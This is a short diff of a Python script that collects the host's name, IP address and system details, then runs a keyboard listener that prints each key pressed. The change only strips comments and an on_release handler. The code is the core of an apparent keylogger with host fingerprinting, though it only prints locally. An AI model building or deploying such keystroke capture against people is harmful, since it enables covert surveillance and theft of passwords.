@@ -22,11 +22,11 @@ finally:
     USER_MACHINE = platform.machine()
     USER_DATA = USER_HOSTNAME + "\n" + USER_IP + "\n" + USER_PROCESSOR + "\n" + USER_SYSTEM + "\n" + USER_MACHINE
     print(USER_DATA)
-    def on_press(key):  # The function that's called when a key is pressed
+    def on_press(key):
         print("Key pressed: {0}".format(key))
 
-    with Listener(on_press=on_press, on_release=on_release) as listener:  # Create an instance of Listener
-        listener.join()  # Join the listener thread to the main thread to keep waiting for keys
+    with Listener(on_press=on_press) as listener: 
+        listener.join()  
 
 
     
